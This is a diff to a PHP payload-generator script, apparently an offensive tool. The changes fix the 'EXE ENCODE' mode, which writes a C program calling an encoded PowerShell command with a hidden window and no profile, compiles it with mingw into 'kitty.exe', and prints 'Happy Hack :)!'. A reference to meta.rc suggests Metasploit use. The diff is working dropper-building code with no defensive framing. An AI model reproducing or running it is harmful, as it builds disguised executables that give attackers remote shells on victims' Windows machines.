@@ -241,6 +241,7 @@ echo "\e[96m".$vba."\e[0m\n";
 ###########################EXE ENCODE#############################
 elseif($lencode == "exe" || $lencode == "EXE"){
 
+$exe_arch = '32';
 $mingw = false;
 if(file_exists('/usr/bin/x86_64-w64-mingw32-gcc')){
 	$mingw= true;
@@ -252,21 +253,19 @@ if(file_exists('/usr/bin/x86_64-w64-mingw32-gcc')){
 
 $powershell_encoded = generate_shell();
 
-$exe ='include <stdio.h>
+$exe ='#include <stdio.h>
 #include <stdlib.h>
 
 int main()
-\{
-    system("powershell -nop -win Hidden -noni -enc '.$powershell_encoded.');
+{
+    system("powershell -nop -win Hidden -noni -enc '.$powershell_encoded.'");
     return 0;
-\}
-
 }';
 
 $ef = fopen("c_file_temp.c", "w") or die("Unable to open file!");
 fwrite($ef, $exe);
-fclose($mf); 
-echo "compiling...";
+fclose($ef); 
+echo "compiling please wait :) ...\n\n";
 
 if ($exe_arch == "32"){
     system("i686-w64-mingw32-gcc c_file_temp.c -o kitty.exe");
@@ -274,7 +273,7 @@ if ($exe_arch == "32"){
     system("x86_64-w64-mingw32-gcc c_file_temp.c -o kitty.exe");
 }
 system("rm c_file_temp.c");
-echo "kitty.exe created!\n";
+echo "kitty.exe created!\n\n";
 echo "\e[101m\e[97mHappy Hack :)!\e[0m\n";
 
 if(file_exists("meta.rc")){
